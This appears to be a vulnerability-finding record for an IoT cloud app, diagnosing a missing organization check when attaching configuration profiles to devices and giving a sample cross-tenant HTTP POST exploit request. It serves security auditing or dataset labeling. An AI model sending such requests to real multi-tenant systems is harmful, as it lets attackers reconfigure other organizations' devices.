diagnosis: The view links an IoTDevice to a ConfigProfile based on IDs submitted in form.cleaned_data. It fails to ensure that both the device and the configuration profile belong to request.user.organization, allowing users to apply arbitrary device configuration profiles across tenants.
exploit_request:
POST /iot/devices/attach-profile/ HTTP/1.1
Host: iot.cloud.example
Cookie: sessionid=user_session
Content-Type: application/x-www-form-urlencoded

device_id=509&profile_id=12
